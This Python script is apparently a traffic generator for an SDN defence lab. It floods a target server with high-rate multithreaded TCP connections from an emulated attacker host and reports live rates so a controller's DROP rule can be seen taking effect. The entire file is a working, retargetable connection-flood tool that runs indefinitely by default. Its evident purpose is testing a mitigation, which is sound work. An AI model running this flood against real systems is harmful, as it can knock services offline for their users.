#!/usr/bin/env python3
"""
attack_tcp_client.py - Anomalous/Attack TCP Traffic Generator

Runs on the attacker host (h4: 10.0.0.4).
Generates high-rate TCP connection bursts toward the target server (10.0.0.1:8080)
using multithreaded workers and tight loops.
Tracks live attempt rates, successes, and drops/timeouts to visibly demonstrate
the exact moment the SDN controller installs the dynamic DROP rule.
"""

import argparse
import socket
import sys
import threading
import time

# Metrics
stats_lock = threading.Lock()
total_attempts = 0
total_success = 0
total_dropped = 0
attempts_in_window = 0
success_in_window = 0
dropped_in_window = 0

running = True


def worker_loop(target_host: str, target_port: int, timeout: float, delay: float):
    """Worker thread repeatedly attempting fast TCP handshakes."""
    global total_attempts, total_success, total_dropped
    global attempts_in_window, success_in_window, dropped_in_window

    request_payload = b"GET /attack HTTP/1.1\r\nHost: target\r\n\r\n"

    while running:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        with stats_lock:
            total_attempts += 1
            attempts_in_window += 1

        connected = False
        try:
            sock.connect((target_host, target_port))
            sock.sendall(request_payload)
            connected = True
        except (socket.timeout, ConnectionRefusedError, OSError):
            connected = False
        finally:
            try:
                sock.close()
            except Exception:
                pass

        with stats_lock:
            if connected:
                total_success += 1
                success_in_window += 1
            else:
                total_dropped += 1
                dropped_in_window += 1

        if delay > 0:
            time.sleep(delay)


def stats_monitor(interval_seconds: float = 1.0):
    """Prints real-time rate metrics every second."""
    global attempts_in_window, success_in_window, dropped_in_window
    last_time = time.time()

    while running:
        time.sleep(interval_seconds)
        now = time.time()
        elapsed = now - last_time

        with stats_lock:
            rate_att = attempts_in_window / elapsed if elapsed > 0 else 0
            rate_succ = success_in_window / elapsed if elapsed > 0 else 0
            rate_drop = dropped_in_window / elapsed if elapsed > 0 else 0

            cur_total = total_attempts
            cur_succ = total_success
            cur_drop = total_dropped

            attempts_in_window = 0
            success_in_window = 0
            dropped_in_window = 0

        last_time = now

        # Status badge (distinguish real SDN blocking from minor OS socket buffer drops)
        drop_ratio = (rate_drop / rate_att) if rate_att > 0 else 0
        if rate_succ == 0 and rate_att > 0:
            badge = "BLOCKED / DROPPED"
        elif drop_ratio >= 0.15:
            badge = "PARTIALLY BLOCKED"
        else:
            badge = "ACTIVE ATTACK"

        print(
            f"[{time.strftime('%H:%M:%S')}] "
            f"[{badge:17s}] "
            f"Attempts: {rate_att:5.1f}/s | "
            f"Passed: {rate_succ:5.1f}/s | "
            f"Blocked: {rate_drop:5.1f}/s | "
            f"Cumulative (Total: {cur_total}, Blocked: {cur_drop})"
        )
        sys.stdout.flush()


def run_attack(
    target_host: str,
    target_port: int,
    threads: int = 5,
    duration: float = 0,
    timeout: float = 0.5,
    delay: float = 0.0,
):
    global running

    print("============================================================")
    print(" [ATTACKER h4] Starting TCP Rapid Connection Flood")
    print(f" Target: {target_host}:{target_port}")
    print(f" Threads: {threads} | Delay: {delay}s | Socket Timeout: {timeout}s")
    print(f" Duration: {'Infinite' if duration <= 0 else f'{duration}s'}")
    print(" Press Ctrl+C to stop the attack")
    print("============================================================")
    sys.stdout.flush()

    # Start stats monitor
    monitor = threading.Thread(target=stats_monitor, args=(1.0,), daemon=True)
    monitor.start()

    # Start worker threads
    worker_threads = []
    for _ in range(threads):
        t = threading.Thread(
            target=worker_loop,
            args=(target_host, target_port, timeout, delay),
            daemon=True,
        )
        t.start()
        worker_threads.append(t)

    start_time = time.time()
    try:
        while running:
            if duration > 0 and (time.time() - start_time) >= duration:
                print(f"\n[INFO] Configured duration ({duration}s) reached.")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[INFO] Stopped by user.")
    finally:
        running = False
        print("\n============================================================")
        print(" [ATTACKER h4] Attack Summary:")
        print(f" Total Attempts:    {total_attempts}")
        print(f" Total Passed:      {total_success}")
        print(f" Total Blocked:     {total_dropped}")
        block_percent = (total_dropped / total_attempts * 100.0) if total_attempts > 0 else 0.0
        print(f" Block Rate:        {block_percent:.1f}%")
        print("============================================================")


def main():
    parser = argparse.ArgumentParser(description="SDN Project TCP Attack Client (h4)")
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        default="10.0.0.1",
        help="Target server IP (default: 10.0.0.1)",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=8080,
        help="Target TCP port (default: 8080)",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=5,
        help="Number of concurrent worker threads (default: 5)",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=float,
        default=0,
        help="Attack duration in seconds (default: 0 for infinite)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=0.5,
        help="Socket connection timeout in seconds (default: 0.5)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Delay between attempts per worker in seconds (default: 0.0 for max speed)",
    )

    args = parser.parse_args()
    run_attack(
        target_host=args.target,
        target_port=args.port,
        threads=args.threads,
        duration=args.duration,
        timeout=args.timeout,
        delay=args.delay,
    )


if __name__ == "__main__":
    main()
